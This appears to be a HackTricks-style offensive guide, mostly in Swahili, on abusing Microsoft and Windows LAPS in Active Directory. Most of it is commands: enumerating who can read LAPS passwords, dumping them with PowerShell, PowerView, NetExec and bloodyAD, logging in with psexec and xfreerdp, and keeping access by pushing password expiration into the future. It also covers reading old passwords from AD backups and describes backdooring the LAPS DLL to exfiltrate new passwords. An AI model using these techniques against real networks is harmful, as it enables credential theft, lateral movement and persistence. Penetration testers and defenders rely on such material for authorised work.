# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Taarifa za Msingi

Kwa sasa kuna **aina 2 za LAPS** unazoweza kukutana nazo wakati wa assessment:

- **Legacy Microsoft LAPS**: huhifadhi password ya local administrator katika **`ms-Mcs-AdmPwd`** na muda wa kuisha katika **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (iliyojengwa ndani ya Windows tangu updates za Aprili 2023): bado inaweza kuiga legacy mode, lakini katika native mode hutumia attributes za **`msLAPS-*`**, inaunga mkono **password encryption**, **password history**, na **DSRM password backup** kwa domain controllers.

LAPS imeundwa kusimamia **local administrator passwords**, na kuzifanya ziwe **unique, randomized, na kubadilishwa mara kwa mara** kwenye computers zilizounganishwa kwenye domain. Ukiweza kusoma attributes hizo, kwa kawaida unaweza **pivot kama local admin** kwenda kwenye host iliyoathiriwa. Katika mazingira mengi, sehemu ya kuvutia si kusoma password yenyewe tu, bali pia kutafuta **nani alipewa delegated access** kwenye password attributes.

### Legacy Microsoft LAPS attributes

Katika computer objects za domain, implementation ya legacy Microsoft LAPS husababisha kuongezwa kwa attributes mbili:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS huongeza attributes kadhaa mpya kwenye computer objects:

- **`msLAPS-Password`**: clear-text password blob iliyohifadhiwa kama JSON wakati encryption haijawezeshwa
- **`msLAPS-PasswordExpirationTime`**: muda uliopangwa wa kuisha
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data kwa domain controllers
- **`msLAPS-CurrentPasswordVersion`**: version tracking inayotegemea GUID inayotumiwa na newer rollback-detection logic (Windows Server 2025 forest schema)

Wakati **`msLAPS-Password`** inaweza kusomwa, value yake ni JSON object inayobeba account name, update time na clear-text password, kwa mfano:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Hakiki ikiwa imewezeshwa
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Upatikanaji wa Nenosiri la LAPS

Unaweza **kupakua raw LAPS policy** kutoka `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` kisha kutumia **`Parse-PolFile`** kutoka pakiti [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) ili kubadilisha faili hii kuwa format inayosomeka na binadamu.

### Legacy Microsoft LAPS PowerShell cmdlets

Ikiwa legacy LAPS module imewekwa, kwa kawaida cmdlets zifuatazo zinapatikana:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS huja na moduli mpya ya PowerShell na cmdlets mpya:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Baadhi ya maelezo ya kiutendaji yana umuhimu hapa:

- **`Get-LapsADPassword`** hushughulikia kiotomatiki **legacy LAPS**, **clear-text Windows LAPS**, na **encrypted Windows LAPS**.
- Ikiwa password imesimbwa kwa njia fiche na unaweza **kusoma** lakini huwezi **kui-decrypt**, cmdlet hurejesha metadata kama **`Source`**, **`DecryptionStatus`**, na **`AuthorizedDecryptor`** hata kama haiwezi kurudisha clear-text password.
- Katika **encrypted Windows LAPS**, **read permission** na **decrypt permission** ni **controls tofauti**. Kuwa na OU / object read access haimaanishi kiotomatiki kwamba unaweza ku-decrypt **`msLAPS-EncryptedPassword`**.
- **Password history** linapatikana tu wakati **Windows LAPS encryption** imewezeshwa.
- Kwenye domain controllers, source inayorejeshwa inaweza kuwa **`EncryptedDSRMPassword`**.

Hii ni muhimu wakati wa assessment kwa sababu field ya **`AuthorizedDecryptor`** inakuambia **ni user au group gani blob ilisimbwa kwa ajili yake**, mara nyingi ikigeuza password read iliyoshindikana kuwa lengo jipya la privilege-escalation.

### PowerView / LDAP

**PowerView** pia inaweza kutumika kujua **nani anaweza kusoma password na kuisoma**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Ikiwa **`msLAPS-Password`** inaweza kusomwa, parse JSON iliyorejeshwa na toa **`p`** kwa nenosiri na **`n`** kwa jina la akaunti ya local admin inayosimamiwa.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Sehemu **`n`** hiyo ni muhimu kwenye deployments mpya kwa sababu **Windows LAPS automatic account management** inaweza kulenga **custom account** badala ya **`Administrator`** iliyojengwa ndani, na mifumo mipya ya **Windows 11 24H2 / Windows Server 2025** inaweza hata **kufanya randomize** jina la akaunti hiyo.

### Linux / remote tooling

Modern tooling inaunga mkono zote mbili legacy Microsoft LAPS na Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notes:

- Recent **NetExec** builds support **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, and **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** is still useful for **legacy Microsoft LAPS** from Linux, but it only targets **`ms-Mcs-AdmPwd`**.
- Newer cross-platform tooling such as **`LAPS4LINUX`**, **`dpapi-ng`**-based tooling, and recent **NetExec** workflows can also handle **native Windows LAPS** from non-Windows hosts.
- If the environment uses **encrypted Windows LAPS**, a simple LDAP read is not enough; you also need to be an **authorized decryptor** (or equivalent decryption material, such as offline domain DPAPI-NG root key material).
- On **Windows 11 24H2 / Windows Server 2025**, don't assume the managed local admin is always **`Administrator`**. Automatic account management can create a custom account and optionally randomize its name, so discover the account name first via **`n`** / **`Account`** before using **`--laps`** at scale.

### Directory synchronization abuse

If you have domain-level **directory synchronization** rights instead of direct read access on each computer object, LAPS can still be interesting.

The combination of **`DS-Replication-Get-Changes`** with **`DS-Replication-Get-Changes-In-Filtered-Set`** or **`DS-Replication-Get-Changes-All`** can be used to synchronize **confidential / RODC-filtered** attributes such as legacy **`ms-Mcs-AdmPwd`**. BloodHound models this as **`SyncLAPSPassword`**. Check [DCSync](dcsync.md) for the replication-rights background.

## LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilitates the enumeration of LAPS with several functions.\
One is parsing **`ExtendedRights`** for **all computers with LAPS enabled.** This shows **groups** specifically **delegated to read LAPS passwords**, which are often users in protected groups.\
An **account** that has **joined a computer** to a domain receives `All Extended Rights` over that host, and this right gives the **account** the ability to **read passwords**. Enumeration may show a user account that can read the LAPS password on a host. This can help us **target specific AD users** who can read LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Kutoa LAPS Passwords Kwa NetExec / CrackMapExec

Ikiwa huna interactive PowerShell, unaweza kutumia vibaya privilege hii kwa mbali kupitia LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Hii hutupa zote za LAPS secrets ambazo mtumiaji anaweza kusoma, ikikuruhusu kusogea laterally kwa kutumia different local administrator password.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Uendelevu wa LAPS

### Tarehe ya Kuisha

Mara tu ukiwa admin, inawezekana **kupata passwords** na **kuzuia** machine **isasishe** **password** yake kwa **kuweka tarehe ya kuisha kuwa ya baadaye**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS hutumia **`msLAPS-PasswordExpirationTime`** badala yake:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Nenosiri bado litazunguka ikiwa **admin** atatumia **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, au ikiwa **Do not allow password expiration time longer than required by policy** imewezeshwa.

### Onyo la snapshot rollback kwenye Windows LAPS mpya zaidi

Mbinu za zamani za snapshot / image rollback ni **zisizoaminika zaidi** dhidi ya usambazaji wa hivi karibuni wa **Windows LAPS**. Kwenye **Windows 11 24H2 / Windows Server 2025**, ikiwa forest schema inajumuisha **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), client hulinganisha GUID iliyohifadhiwa ndani ya kifaa na thamani iliyohifadhiwa kwenye AD na **huzungusha mara moja nenosiri** wakati rollback inaunda **torn state**.

Kivitendo, hii inamaanisha persistence inayotegemea snapshot au majaribio ya kufufua tena nenosiri la zamani linalojulikana la local admin yanaweza kuharibiwa haraka badala ya kuendelea hadi muda wa kawaida wa kuisha kwa nenosiri.

Ulinzi huu unatumika tu kwa **AD-backed Windows LAPS** na bado unategemea mashine iliyorejeshwa kuwa na uwezo wa **kuthibitisha tena kwa AD**. Ikiwa mashine haiwezi tena kuzungumza na AD, **password history** au **AD backup access** bado vinaweza kusaidia.

### Onyo la kuvuruga automatic account management

Wakati **automatic account management** imewezeshwa, Windows LAPS husimamia mzunguko wa maisha wa local admin account inayodhibitiwa. Majaribio yasiyotarajiwa ya kuibadilisha jina, kuisanidi upya, au kwa namna nyingine kuiharibu account hiyo yanaweza kukataliwa kwa **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, hivyo persistence inayotegemea kubadilisha kimyakimya managed LAPS account si ya kuaminika sana kwenye endpoints mpya zaidi.

### Kurejesha historical passwords kutoka AD backups

Wakati **Windows LAPS encryption + password history** imewezeshwa, AD backups zilizowekwa inaweza kuwa chanzo cha ziada cha secrets. Ikiwa unaweza kufikia mounted AD snapshot na kutumia **recovery mode**, unaweza kuuliza stored passwords za zamani bila kuzungumza na live DC.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Hii ni muhimu zaidi wakati wa **AD backup theft**, **offline forensics abuse**, au **disaster-recovery media access**.

### Backdoor

Msimbo asili wa chanzo wa legacy Microsoft LAPS unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), hivyo inawezekana kuweka backdoor ndani ya code (kwa mfano ndani ya method `Get-AdmPwdPassword` katika `Main/AdmPwd.PS/Main.cs`) ambayo kwa njia fulani itafanya **exfiltrate new passwords au kuzihifadhi mahali fulani**.

Kisha, compile `AdmPwd.PS.dll` mpya na uipakie kwenye machine katika `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (na ubadilishe modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
